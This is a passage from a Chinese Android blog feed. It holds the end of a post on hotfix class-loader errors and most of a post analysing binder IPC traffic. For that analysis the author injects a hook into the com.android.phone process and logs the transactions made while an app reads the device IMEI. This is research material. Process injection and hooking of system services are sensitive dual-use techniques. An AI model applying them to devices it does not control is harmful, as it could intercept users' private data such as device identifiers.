href="#0x02-解决方案" class="headerlink" title="0x02 解决方案"></a>0x02 解决方案</h1><p>既然这里需要让它在对比类加载器的时候成功，那么bootclassloader在GetClassLoader的地方返回空，那我们也让补丁类在调用这个方法返回空即可，也就是说这里使用反射，将补丁类的classloader置为空即可。目前尝试了下，这么做的话，确实是可以避免这个IllegalAccessExecption的，但是目前来说，对补丁类的类加载器进行置空的操作，并不确定是否存在其他问题，具体得看后续的测试结果了。</p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>总结就是，我好菜啊，没有考虑到常见热修方案都是app的，可能没有考虑过系统上的一些问题。。。还得多学点儿东西的样子，溜了溜了。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;组里有java热修复项目，其中有一部分功能是根据diff自动生成补丁，在最近维护的时候，遇到了一个问题，在补丁运行时会出现IllegalAccessException，说到这里可能很多人就已经知道答案了，由于IsInSamePackage导致，因此反射替换类加载器为原先的类即可。 这样确实没什么问题，但是我们的场景在系统中，于是这里遇上了一些新的问题。情况是，在替换类加载器后，仍然在IsInSamePackage中没有通过类加载器是否相同的校验，导致返回false，抛出非法访问的异常。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>从binder数据传输的角度来分析binder通信的过程</title>
    <link href="http://yoursite.com/2019/04/21/%E4%BB%8Ebinder%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E7%9A%84%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90binder%E9%80%9A%E4%BF%A1%E7%9A%84%E8%BF%87%E7%A8%8B/"/>
    <id>http://yoursite.com/2019/04/21/%E4%BB%8Ebinder%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E7%9A%84%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90binder%E9%80%9A%E4%BF%A1%E7%9A%84%E8%BF%87%E7%A8%8B/</id>
    <published>2019-04-21T06:04:47.000Z</published>
    <updated>2020-07-28T14:09:16.734Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Binder-数据分析"><a href="#Binder-数据分析" class="headerlink" title="Binder 数据分析"></a>Binder 数据分析</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前一阵弄了一个和binder有关的小工具 <a href="https://github.com/EggUncle/Hermes" target="_blank" rel="noopener">https://github.com/EggUncle/Hermes</a> ，大概就是通过对ioctl进行hook，读取到binder的数据信息。</p><p>binder的具体原理等细节这里就不讨论了，我们此处仅仅从数据的角度来分析一下获取手机imei时，binder的请求和响应过程。<br><br>操作环境: Nexus5x aosp 7.1.2</p><a id="more"></a><h2 id="0x01-获取数据"><a href="#0x01-获取数据" class="headerlink" title="0x01 获取数据"></a>0x01 获取数据</h2><p>首先使用注入工具对com.android.phone 进行hook，并且使用工具获取其服务的相关信息。</p><p>注入工具可以使用这个: <a href="https://github.com/EggUncle/PtraceInject" target="_blank" rel="noopener">https://github.com/EggUncle/PtraceInject</a>  (仅支持android7以及7以下的系统)</p><p>获取服务信息的工具可以使用这个: <a href="https://github.com/EggUncle/DumpAndroidServicesInfo" target="_blank" rel="noopener">https://github.com/EggUncle/DumpAndroidServicesInfo</a> （获取到的结果是一个json文件）</p><p>注入工具之后，打开测试用的获取imei的app，点击获取imei的按钮，打开logcat，搜索关键字获取LIB_BINDER_HOOK，到的数据如下（时间的信息已经删除，时间的log信息和此处的分析没有关系）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: ---------------------------------</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: read BR_TRANSACTION</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: PID = 11804, code = 124, dump name : @)com.android.internal.telephony.ITelephonycom.test.androidbinderhook , pname size is 69, data size is 152 , target is 777fcde708  777fcde708</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 04004001 29000000 63006f00 6d002e00  ..@.)...c.o.m...</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 61006e00 64007200 6f006900 64002e00  a.n.d.r.o.i.d...</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 69006e00 74006500 72006e00 61006c00  i.n.t.e.r.n.a.l.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 2e007400 65006c00 65007000 68006f00  ..t.e.l.e.p.h.o.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 6e007900 2e004900 54006500 6c006500  n.y...I.T.e.l.e.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 70006800 6f006e00 79000000 1a000000  p.h.o.n.y.......</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 63006f00 6d002e00 74006500 73007400  c.o.m...t.e.s.t.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 2e006100 6e006400 72006f00 69006400  ..a.n.d.r.o.i.d.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 62006900 6e006400 65007200 68006f00  b.i.n.d.e.r.h.o.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 6f006b00 00000000                    o.k.....</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: write BC_TRANSACTION</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: PID = 0, code = 53, dump name : @android.app.IActivityManager.android.permission.READ_PRIVILEGED_PHONE_STATE.n&apos; , pname size is 79, data size is 176 , target is 777fcde804  777fcde804</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 04004001 1c000000 61006e00 64007200  ..@.....a.n.d.r.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 6f006900 64002e00 61007000 70002e00  o.i.d...a.p.p...</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 49004100 63007400 69007600 69007400  I.A.c.t.i.v.i.t.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 79004d00 61006e00 61006700 65007200  y.M.a.n.a.g.e.r.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 00000000 2e000000 61006e00 64007200  ........a.n.d.r.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 6f006900 64002e00 70006500 72006d00  o.i.d...p.e.r.m.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 69007300 73006900 6f006e00 2e005200  i.s.s.i.o.n...R.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 45004100 44005f00 50005200 49005600  E.A.D._.P.R.I.V.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 49004c00 45004700 45004400 5f005000  I.L.E.G.E.D._.P.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 48004f00 4e004500 5f005300 54004100  H.O.N.E._.S.T.A.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 54004500 00000000 1c2e0000 6e270000  T.E.........n&apos;..</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: ---------------------------------</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: ---------------------------------</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: read BR_REPLY</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: PID = 0, code = 0, dump name :  , pname size is 0, data size is 8 , target is 777fcde708  777fcde708</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 00000000 ffffffff                    ........</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: write BC_TRANSACTION</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: PID = 0, code = 53, dump name : @android.app.IActivityManager#android.permission.READ_PHONE_STATE.n&apos; , pname size is 68, data size is 152 , target is 777fcde810  777fcde810</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 04004001 1c000000 61006e00 64007200  ..@.....a.n.d.r.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 6f006900 64002e00 61007000 70002e00  o.i.d...a.p.p...</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 49004100 63007400 69007600 69007400  I.A.c.t.i.v.i.t.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 79004d00 61006e00 61006700 65007200  y.M.a.n.a.g.e.r.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 00000000 23000000 61006e00 64007200  ....#...a.n.d.r.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 6f006900 64002e00 70006500 72006d00  o.i.d...p.e.r.m.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 69007300 73006900 6f006e00 2e005200  i.s.s.i.o.n...R.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 45004100 44005f00 50004800 4f004e00  E.A.D._.P.H.O.N.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 45005f00 53005400 41005400 45000000  E._.S.T.A.T.E...</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 1c2e0000 6e270000                    ....n&apos;..</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: ---------------------------------</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: ---------------------------------</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: read BR_REPLY</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: PID = 0, code = 0, dump name :  , pname size is 0, data size is 8 , target is 777fcde708  777fcde708</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 00000000 00000000                    ........</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: write BC_TRANSACTION</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: PID = 0, code = 2, dump name : @&apos;com.android.internal.app.IAppOpsService3n&apos;com.test.androidbinderhook , pname size is 70, data size is 156 , target is 777fcde810  777fcde810</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 04004001 27000000 63006f00 6d002e00  ..@.&apos;...c.o.m...</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 61006e00 64007200 6f006900 64002e00  a.n.d.r.o.i.d...</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 69006e00 74006500 72006e00 61006c00  i.n.t.e.r.n.a.l.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 2e006100 70007000 2e004900 41007000  ..a.p.p...I.A.p.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 70004f00 70007300 53006500 72007600  p.O.p.s.S.e.r.v.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 69006300 65000000 33000000 6e270000  i.c.e...3...n&apos;..</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 1a000000 63006f00 6d002e00 74006500  ....c.o.m...t.e.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 73007400 2e006100 6e006400 72006f00  s.t...a.n.d.r.o.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 69006400 62006900 6e006400 65007200  i.d.b.i.n.d.e.r.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 68006f00 6f006b00 00000000           h.o.o.k.....</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: ---------------------------------</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: ---------------------------------</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: read BR_REPLY</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: PID = 0, code = 0, dump name :  , pname size is 0, data size is 8 , target is 777fcde708  777fcde708</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 00000000 00000000                    ........</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: write BC_REPLY</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: PID = 0, code = 0, dump name : 354360070189667 , pname size is 15, data size is 40 , target is 777fcde810  777fcde810</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 00000000 0f000000 33003500 34003300  ........3.5.4.3.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 36003000 30003700 30003100 38003900  6.0.0.7.0.1.8.9.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 36003600 37000000                    6.6.7...</span><br><span class="line">11804-11804/com.test.androidbinderhook I/LIB_BINDER_HOOK: onClick: 354360070189667</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: ---------------------------------</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: write BC_REPLY</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: PID = 0, code = 0, dump name : 354360070189667 , pname size is 15, data size is 40 , target is 777fcde810  777fcde810</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 00000000 0f000000 33003500 34003300  ........3.5.4.3.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 36003000 30003700 30003100 38003900  6.0.0.7.0.1.8.9.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 36003600 37000000                    6.6.7...</span><br></pre></td></tr></table></figure></p><h2 id="0x02-binder传输的数据结构"><a href="#0x02-binder传输的数据结构" class="headerlink" title="0x02 binder传输的数据结构"></a>0x02 binder传输的数据结构</h2><p>在对binder的数据进行分析之前，我们还是很有必要看一下binder本身在传输过程中的数据结构信息的。在binder传输数据的时候，它会使用到一个叫binder_write_read的结构体，它的信息如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct binder_write_read &#123;</span><br><span class="line">binder_size_twrite_size;/* bytes to write */</span><br><span class="line">binder_size_twrite_consumed;/* bytes consumed by driver */</span><br><span class="line">binder_uintptr_twrite_buffer;</span><br><span class="line">binder_size_tread_size;/* bytes to read */</span><br><span class="line">binder_size_tread_consumed;/* bytes consumed by driver */</span><br><span class="line">binder_uintptr_tread_buffer;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>其中存储了上文中数据的成员是write_consumed和read_consumed，他们分别对应读和写的时候的一些指令时用到的数据。<br>binder数据传输的过程如下图：</p><p><img src="https://qiangbo-workspace.oss-cn-shanghai.aliyuncs.com/2017-01-15-AndroidAnatomy_Binder/binder_request_sequence.png" alt=""><br>图片摘自<a href="https://paul.pub/android-binder-driver/" target="_blank" rel="noopener">https://paul.pub/android-binder-driver/</a></p><p>其中的write_consumed部分的数据包括BC_TRANSACTION和BC_REPLY，read_consumed部分的数据包括BR_TRANSACTION和BR_REPLY。</p><p>接下来再看一下write_consumed中存储的数据的数据结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">struct binder_transaction_data &#123;</span><br><span class="line">/* The first two are only used for bcTRANSACTION and brTRANSACTION,</span><br><span class="line"> * identifying the target and contents of the transaction.</span><br><span class="line"> */</span><br><span class="line">union &#123;</span><br><span class="line">/* target descriptor of command transaction */</span><br><span class="line">__u32handle;</span><br><span class="line">/* target descriptor of return transaction */</span><br><span class="line">binder_uintptr_t ptr;</span><br><span class="line">&#125; target;</span><br><span class="line">binder_uintptr_tcookie;/* target object cookie */</span><br><span class="line">__u32code;/* transaction command */</span><br><span class="line"></span><br><span class="line">/* General information about the transaction. */</span><br><span class="line">__u32        flags;</span><br><span class="line">pid_tsender_pid;</span><br><span class="line">uid_tsender_euid;</span><br><span class="line">binder_size_tdata_size;/* number of bytes of data */</span><br><span class="line">binder_size_tdata_offsets;/* number of bytes of offsets */</span><br><span class="line"></span><br><span class="line">/* If this transaction is inline, the data immediately</span><br><span class="line"> * follows here; otherwise, it ends with a pointer to</span><br><span class="line"> * the data buffer.</span><br><span class="line"> */</span><br><span class="line">union &#123;</span><br><span class="line">struct &#123;</span><br><span class="line">/* transaction data */</span><br><span class="line">binder_uintptr_tbuffer;</span><br><span class="line">/* offsets from buffer to flat_binder_object structs */</span><br><span class="line">binder_uintptr_toffsets;</span><br><span class="line">&#125; ptr;</span><br><span class="line">__u8buf[8];</span><br><span class="line">&#125; data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>其中的code，为对应的binder服务提供的方法的编号(这里可以通过源码或者上文中的工具获取到的服务信息来通过服务名称和编号来找到对应的方法),target相当于一个句柄，用来标识相关的发起请求的对象，而data即为实际传输的数据。接下来就可以开始实际的分析数据了。</p><h2 id="0x03-数据分析"><a href="#0x03-数据分析" class="headerlink" title="0x03 数据分析"></a>0x03 数据分析</h2><p>这里从第一条数据看起<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">6094-6105/? E/LIB_BINDER_HOOK: read BR_TRANSACTION</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: PID = 11804, code = 124, dump name : @)com.android.internal.telephony.ITelephonycom.test.androidbinderhook , pname size is 69, data size is 152 , target is 777fcde708  777fcde708</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 04004001 29000000 63006f00 6d002e00  ..@.)...c.o.m...</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 61006e00 64007200 6f006900 64002e00  a.n.d.r.o.i.d...</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 69006e00 74006500 72006e00 61006c00  i.n.t.e.r.n.a.l.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 2e007400 65006c00 65007000 68006f00  ..t.e.l.e.p.h.o.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 6e007900 2e004900 54006500 6c006500  n.y...I.T.e.l.e.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 70006800 6f006e00 79000000 1a000000  p.h.o.n.y.......</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 63006f00 6d002e00 74006500 73007400  c.o.m...t.e.s.t.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 2e006100 6e006400 72006f00 69006400  ..a.n.d.r.o.i.d.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 62006900 6e006400 65007200 68006f00  b.i.n.d.e.r.h.o.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 6f006b00 00000000                    o.k.....</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: write BC_TRANSACTION</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: PID = 0, code = 53, dump name : @android.app.IActivityManager.android.permission.READ_PRIVILEGED_PHONE_STATE.n&apos; , pname size is 79, data size is 176 , target is 777fcde804  777fcde804</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 04004001 1c000000 61006e00 64007200  ..@.....a.n.d.r.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 6f006900 64002e00 61007000 70002e00  o.i.d...a.p.p...</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 49004100 63007400 69007600 69007400  I.A.c.t.i.v.i.t.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 79004d00 61006e00 61006700 65007200  y.M.a.n.a.g.e.r.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 00000000 2e000000 61006e00 64007200  ........a.n.d.r.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 6f006900 64002e00 70006500 72006d00  o.i.d...p.e.r.m.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 69007300 73006900 6f006e00 2e005200  i.s.s.i.o.n...R.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 45004100 44005f00 50005200 49005600  E.A.D._.P.R.I.V.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 49004c00 45004700 45004400 5f005000  I.L.E.G.E.D._.P.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 48004f00 4e004500 5f005300 54004100  H.O.N.E._.S.T.A.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 54004500 00000000 1c2e0000 6e270000  T.E.........n&apos;..</span><br></pre></td></tr></table></figure></p><p>首先这里有两条命令<br><br>第一条是BR_TRANSACTION，这里com.android.phone作为服务端，接受了br的请求，pid为 11804，这里是获取imei的测试app的pid，然后可以通过报文中的字符串信息看到与它通信的服务是ITelephony，然后在上文中获取到的服务信息中搜索相应的code，可以看到对应的方法的信息，即getDeviceId,获取imei的方法，同时它需要传入一个报名作为参数，而报文中也有包名相关的信息(com.test.androidbinderhook)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: 124,</span><br><span class="line">  &quot;methodName&quot;: &quot;getDeviceId&quot;,</span><br><span class="line">  &quot;paramTypeList&quot;: [</span><br><span class="line">    &quot;java.lang.String&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p><p>接下来详细分析其中的数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 04004001 29000000 63006f00 6d002e00  ..@.)...c.o.m...</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 61006e00 64007200 6f006900 64002e00  a.n.d.r.o.i.d...</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 69006e00 74006500 72006e00 61006c00  i.n.t.e.r.n.a.l.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 2e007400 65006c00 65007000 68006f00  ..t.e.l.e.p.h.o.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 6e007900 2e004900 54006500 6c006500  n.y...I.T.e.l.e.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 70006800 6f006e00 79000000 1a000000  p.h.o.n.y.......</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 63006f00 6d002e00 74006500 73007400  c.o.m...t.e.s.t.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 2e006100 6e006400 72006f00 69006400  ..a.n.d.r.o.i.d.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 62006900 6e006400 65007200 68006f00  b.i.n.d.e.r.h.o.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 6f006b00 00000000                    o.k.....</span><br><span class="line"></span><br><span class="line">04004001 这部分和后面的字符串组成请求binder的对象的的标识，一般在binder的客户端部分用data.writeInterfaceToken(DESCRIPTOR)设置</span><br><span class="line">29000000 对应着10进制的41，代表着后续字符串的长度com.android.internal.telephony.ITelephony</span><br><span class="line">1a000000 对应着10进制的26，代表着后续字符串的长度com.test.androidbinderhook</span><br><span class="line">00000000 这个我也没整明白是个啥，可能是对齐用的数据</span><br></pre></td></tr></table></figure></p><p>然后看看源码，从代码角度看看这个地方执行的过程，首先找到TelephonyManager 的getDeviceId的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">843    public String getDeviceId() &#123;</span><br><span class="line">844        try &#123;</span><br><span class="line">845            ITelephony telephony = getITelephony();</span><br><span class="line">846            if (telephony == null)</span><br><span class="line">847                return null;</span><br><span class="line">848            return telephony.getDeviceId(mContext.getOpPackageName());</span><br><span class="line">849        &#125; catch (RemoteException ex) &#123;</span><br><span class="line">850            return null;</span><br><span class="line">851        &#125; catch (NullPointerException ex) &#123;</span><br><span class="line">852            return null;</span><br><span class="line">853        &#125;</span><br><span class="line">854    &#125;</span><br></pre></td></tr></table></figure></p><p>这里可以看到它调用了ITelephony的getDeviceId并传入包名</p><p>接下来是第二个命令BC_TRANSACTION，我这里的理解是，phone中的服务，作为客户端，与其他binder进行交互，所以这里使用了BC_TRANSACTION的指令.从解析出来的字符串可知这里请求的相关服务为android.app.IActivityManager，code 53 对应的方法是如下: (这里补充以下，我提供的获取服务信息的工具，由于权限问题导致部分服务的信息获取不到，此处的的方法信息，是通过源码找到的)</p><p>public int checkPermission(String permission, int pid, int uid)</p><p>接下来看报文<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 04004001 1c000000 61006e00 64007200  ..@.....a.n.d.r.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 6f006900 64002e00 61007000 70002e00  o.i.d...a.p.p...</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 49004100 63007400 69007600 69007400  I.A.c.t.i.v.i.t.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 79004d00 61006e00 61006700 65007200  y.M.a.n.a.g.e.r.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 00000000 2e000000 61006e00 64007200  ........a.n.d.r.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 6f006900 64002e00 70006500 72006d00  o.i.d...p.e.r.m.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 69007300 73006900 6f006e00 2e005200  i.s.s.i.o.n...R.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 45004100 44005f00 50005200 49005600  E.A.D._.P.R.I.V.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 49004c00 45004700 45004400 5f005000  I.L.E.G.E.D._.P.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 48004f00 4e004500 5f005300 54004100  H.O.N.E._.S.T.A.</span><br><span 